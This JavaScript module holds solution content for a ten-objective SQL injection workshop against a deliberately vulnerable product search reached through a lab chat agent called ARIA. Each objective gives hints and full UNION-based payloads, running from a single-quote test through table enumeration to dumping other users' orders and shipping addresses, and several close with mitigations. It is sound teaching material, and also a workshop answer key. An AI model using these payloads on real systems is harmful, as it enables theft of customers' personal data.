'use strict';
/**
 * SQL Injection Workshop — Solution content for 10 objectives
 * This is an educational workshop for learning UNION-based SQL Injection techniques.
 * All payloads target the ARIA agent's vulnerable product search in LAB_MODE=vuln.
 *
 * Products table has 8 columns: id, product_id, name, category, price, description, stock, available
 */
module.exports = {
  sqli_1: {
    title: 'Trigger SQL Syntax Error',
    difficulty: 'Beginner',
    hints: [
      "Try sending a character that SQL uses as a string delimiter",
      "Single quotes ( ' ) are used to wrap string values in SQL queries",
      "In the ARIA chat, search for a product with a name containing just a single quote: search for products named '"
    ],
    examples: [
      "search for products named '",
      "find '"
    ],
    approach: `In vulnerable mode, the ARIA agent's product search concatenates your input directly into a SQL LIKE query without sanitization:
  SELECT ... FROM products WHERE name LIKE '%YOUR_INPUT%'

A single quote (') breaks the string delimiter, resulting in malformed SQL:
  WHERE name LIKE '%'%'
This causes SQLITE_ERROR and reveals the injection point. This is the classic first test for SQL injection — if the application returns an error on a single quote, the field is injectable.`,
    tips: [
      "Error messages like 'SQLITE_ERROR: unrecognized token' confirm the injection point",
      "In a real app this error would be hidden, but the behavior change (error vs. empty result) is still detectable",
      "This is Step 1 of any SQL injection assessment: the single-quote test"
    ]
  },

  sqli_2: {
    title: 'Boolean-Based Bypass',
    difficulty: 'Beginner',
    hints: [
      "SQL conditions can be chained with OR — if one side is always true, the whole WHERE clause is true",
      "Try injecting an OR condition that always evaluates to true after escaping the LIKE string",
      "Payload format: close the LIKE string with %', then add OR '1'='1' and comment out the rest with --"
    ],
    examples: [
      "search for %' OR '1'='1'--",
      "find products %' OR '1'='1'--"
    ],
    approach: `This injection transforms a filtered query into one that returns all rows:
  Original: WHERE name LIKE '%INPUT%'
  Injected: WHERE name LIKE '%' OR '1'='1'-- %'

Since '1'='1' is always true, every product row matches the WHERE clause, returning the full product catalog regardless of the search term. This technique is called a boolean-based bypass — useful when the application displays query results directly.`,
    tips: [
      "The '--' at the end is a SQL comment that neutralises the trailing '%' from the original query",
      "This is the same technique behind classic authentication bypasses like: username = ' OR '1'='1'--",
      "In fixed mode, the input is parameterized — '1'='1' is treated as a literal search string, not SQL logic"
    ]
  },

  sqli_3: {
    title: 'Determine Column Count via ORDER BY',
    difficulty: 'Beginner',
    hints: [
      "Before performing UNION injection you need to know how many columns the original query returns",
      "ORDER BY can reference columns by position number — ORDER BY 1 sorts by column 1, ORDER BY 8 by column 8",
      "Try increasing the ORDER BY number until you get an error — the last successful number is the column count"
    ],
    examples: [
      "search for %' ORDER BY 1--",
      "search for %' ORDER BY 5--",
      "search for %' ORDER BY 8--",
      "search for %' ORDER BY 9--  (this should error — 9 exceeds column count)"
    ],
    approach: `The products table SELECT returns 8 columns: id, product_id, name, category, price, description, stock, available.

  Injected: WHERE name LIKE '%' ORDER BY 8-- (succeeds — 8 columns exist)
  Injected: WHERE name LIKE '%' ORDER BY 9-- (errors — column 9 doesn't exist)

This technique from PortSwigger's UNION attack guide is used to determine the column count before crafting a UNION SELECT. The number where ORDER BY starts failing (N+1) tells you the exact column count (N).`,
    tips: [
      "Binary search works: if ORDER BY 4 succeeds and ORDER BY 8 errors, try ORDER BY 6...",
      "ORDER BY errors are different from syntax errors — ORDER BY 9 says 'no such column: 9', not a parse error",
      "You can also use ORDER BY with column names if you already know the schema"
    ]
  },

  sqli_4: {
    title: 'UNION NULL Probe — Wrong Column Count',
    difficulty: 'Intermediate',
    hints: [
      "UNION SELECT combines results from two queries — but both queries must return the same number of columns",
      "Start with UNION SELECT NULL-- and observe the error message",
      "The error will tell you there is a column count mismatch, confirming the injection works but needs more NULLs"
    ],
    examples: [
      "search for %' UNION SELECT NULL--",
      "search for %' UNION SELECT NULL,NULL--",
      "search for %' UNION SELECT NULL,NULL,NULL,NULL--"
    ],
    approach: `This is the starting point of UNION-based injection from the PortSwigger guide:
  Injected: WHERE name LIKE '%' UNION SELECT NULL-- %'

SQLite will return: "SELECTs to the left and right of UNION do not have the same number of result columns"

This error confirms:
1. The injection point is working
2. UNION SELECT is being executed
3. You need to add more NULLs to match the column count

Keep adding NULLs one at a time until the error disappears. Each NULL matches one column in the original SELECT.`,
    tips: [
      "NULL is used instead of actual values because NULL is compatible with any column data type",
      "The error message itself is valuable — it confirms the injection is executing server-side SQL",
      "This objective and sqli_5 together form the column-count determination phase of UNION injection"
    ]
  },

  sqli_5: {
    title: 'Match Column Count with UNION SELECT',
    difficulty: 'Intermediate',
    hints: [
      "From sqli_3 you know the products query returns 8 columns",
      "Add one NULL for each column in the original SELECT",
      "When the column count matches, the UNION will execute successfully and return a row of NULLs"
    ],
    examples: [
      "search for %' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
    ],
    approach: `With 8 NULLs matching the 8 columns (id, product_id, name, category, price, description, stock, available):
  Injected: WHERE name LIKE '%' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--

The query executes without error and returns a row with all NULL values appended to the normal results. This confirms the UNION is working and you can now replace NULLs with expressions to extract data.

The 8 columns of the products table are: id (int), product_id (text), name (text), category (text), price (real), description (text), stock (int), available (int).`,
    tips: [
      "A successful result with NULL rows confirms the UNION injection is fully operational",
      "NULL rows may appear as empty/blank entries in the ARIA response",
      "Once this works, you can replace any NULL with an expression: column names, functions, or string literals"
    ]
  },

  sqli_6: {
    title: 'Identify String-Compatible Columns',
    difficulty: 'Intermediate',
    hints: [
      "Not all columns accept string data — integer columns will error if you put a string value in them",
      "Replace one NULL at a time with a string literal to find which positions accept text",
      "Column 3 (name) and column 4 (category) are TEXT columns — try putting 'SQLI_TEST' there"
    ],
    examples: [
      "search for %' UNION SELECT NULL,NULL,'SQLI_TEST',NULL,NULL,NULL,NULL,NULL--",
      "search for %' UNION SELECT NULL,'FOUND',NULL,NULL,NULL,NULL,NULL,NULL--"
    ],
    approach: `Once you know the column count, identify which columns display string data in the output:
  Injected: WHERE name LIKE '%' UNION SELECT NULL,NULL,'SQLI_TEST',NULL,NULL,NULL,NULL,NULL--

If 'SQLI_TEST' appears in the ARIA response (in the name position), column 3 accepts strings. This matters because:
- You can only exfiltrate text-type data through string columns
- The columns that appear in the chat response are the ones ARIA formats and shows you
- Products columns 2 (product_id), 3 (name), 4 (category), 6 (description) are TEXT

This is the string column identification step from the PortSwigger UNION attack guide.`,
    tips: [
      "Use a distinctive marker like 'SQLI_TEST' or 'INJECTED' so you can spot it in the response",
      "ARIA will display the product name in its response — that maps to column 3",
      "Once you find a string column, you can replace the literal with SQL functions like sqlite_version()"
    ]
  },

  sqli_7: {
    title: 'Extract Database Version',
    difficulty: 'Intermediate',
    hints: [
      "SQLite has a built-in function sqlite_version() that returns the database version string",
      "Replace the string literal in a text column with sqlite_version()",
      "The version will appear in ARIA's response where the product name would normally be"
    ],
    examples: [
      "search for %' UNION SELECT NULL,NULL,sqlite_version(),NULL,NULL,NULL,NULL,NULL--"
    ],
    approach: `Replace the string literal with the sqlite_version() function:
  Injected: WHERE name LIKE '%' UNION SELECT NULL,NULL,sqlite_version(),NULL,NULL,NULL,NULL,NULL--

The database version (e.g., '3.39.2') will appear as a product name in ARIA's response. This technique is used in real assessments to:
1. Confirm the database type (SQLite vs MySQL vs PostgreSQL)
2. Identify version-specific vulnerabilities
3. Determine available functions and syntax

In MySQL you would use @@version or VERSION(), in PostgreSQL version(), in SQLite sqlite_version().`,
    tips: [
      "Database version disclosure is classified as information gathering in OWASP",
      "Different databases have different version functions — this confirms you're targeting SQLite",
      "sqlite_version() returns a string, so it works in any TEXT column position"
    ]
  },

  sqli_8: {
    title: 'Enumerate Database Tables',
    difficulty: 'Advanced',
    hints: [
      "SQLite has a special table called sqlite_master that lists all tables, indexes, and triggers in the database",
      "Query sqlite_master to get table names: SELECT name FROM sqlite_master WHERE type='table'",
      "Inject this as a subquery in the UNION to extract the table list through the product name column"
    ],
    examples: [
      "search for %' UNION SELECT NULL,NULL,name,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--"
    ],
    approach: `SQLite's sqlite_master table is the schema catalog — equivalent to information_schema.tables in MySQL:
  Injected: WHERE name LIKE '%' UNION SELECT NULL,NULL,name,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--

This returns one row per table, with the table name in position 3 (the 'name' column). ARIA will show each table name as if it were a product name. Expected results include: products, orders, receipts, cart, chat_history.

From this you can identify high-value targets like the orders table which contains sensitive user data.

In MySQL the equivalent would be: UNION SELECT NULL,NULL,table_name,... FROM information_schema.tables`,
    tips: [
      "sqlite_master is always present and readable by any SQLite connection — no privilege escalation needed",
      "type='table' filters out indexes and triggers from the results",
      "Once you know the table names, the next step is to learn their column structure (sqli_9)"
    ]
  },

  sqli_9: {
    title: 'Dump Column Schema from Orders Table',
    difficulty: 'Advanced',
    hints: [
      "sqlite_master also stores the CREATE TABLE statement in its 'sql' column",
      "Query the 'sql' column where name='orders' to see the full orders table schema",
      "This tells you exactly which column names and types exist in the orders table"
    ],
    examples: [
      "search for %' UNION SELECT NULL,NULL,sql,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE name='orders'--",
      "search for %' UNION SELECT NULL,NULL,sql,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table' AND name='orders'--"
    ],
    approach: `The sqlite_master 'sql' column contains the original CREATE TABLE statement:
  Injected: WHERE name LIKE '%' UNION SELECT NULL,NULL,sql,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE name='orders'--

ARIA will return the full CREATE TABLE orders (...) DDL, revealing all columns:
  order_number, user_id, product_name, quantity, unit_price, total_amount, shipping_address, status, payment_method, created_at

In MySQL you would query information_schema.columns or use UNION SELECT NULL,NULL,column_name FROM information_schema.columns WHERE table_name='orders'.

This gives you the exact column names needed for the final data extraction step.`,
    tips: [
      "Knowing column names is essential — you can't SELECT a column you don't know exists",
      "The sql column contains the raw CREATE TABLE SQL — it's a text field, so it fits in column 3",
      "Look for sensitive columns: user_id, shipping_address, payment_method — these are the targets"
    ]
  },

  sqli_10: {
    title: 'Extract Sensitive Order Data',
    difficulty: 'Advanced',
    hints: [
      "You now know the orders table schema from sqli_9: order_number, user_id, product_name, quantity, unit_price, total_amount, shipping_address, status...",
      "Use UNION SELECT to pull order data from the orders table — you can access ANY user's orders, not just 'current_user'",
      "Map orders columns to the 8 positions in the products SELECT: put order_number in position 3, user_id in position 4, total_amount in position 5"
    ],
    examples: [
      "search for %' UNION SELECT NULL,NULL,order_number,user_id,total_amount,NULL,NULL,NULL FROM orders--",
      "search for %' UNION SELECT NULL,NULL,order_number,user_id,shipping_address,NULL,NULL,NULL FROM orders--"
    ],
    approach: `This is the culmination of the UNION injection attack chain:
  Injected: WHERE name LIKE '%' UNION SELECT NULL,NULL,order_number,user_id,total_amount,NULL,NULL,NULL FROM orders--

The query returns all rows from the orders table, regardless of which user they belong to. ARIA displays them as if they were products:
  - Column 3 (name) → order_number
  - Column 4 (category) → user_id
  - Column 5 (price) → total_amount

This demonstrates Broken Object Level Authorization (BOLA/IDOR) via SQL injection — an attacker can extract other users' order history, shipping addresses, and payment records.

In a real ShopFast deployment, this would expose PII, order amounts, and delivery addresses for all customers.`,
    tips: [
      "This attack works because the vulnerable products query runs in the same DB connection as the orders table",
      "The key lesson: SQL injection in any query can expose data from unrelated tables in the same database",
      "In fixed mode, parameterized queries prevent the injection — the payload is treated as a literal search string",
      "Real-world mitigations: parameterized queries, input validation, least-privilege DB connections, WAF rules"
    ]
  }
};

// Temporary staged engine selection; preserve SQLite lessons until the full cutover.
if (process.env.WORKSHOP_DATABASE_ENGINE === 'postgres') {
  module.exports = require('./postgres/sqlInjectionWorkshopSolutions')(module.exports);
}
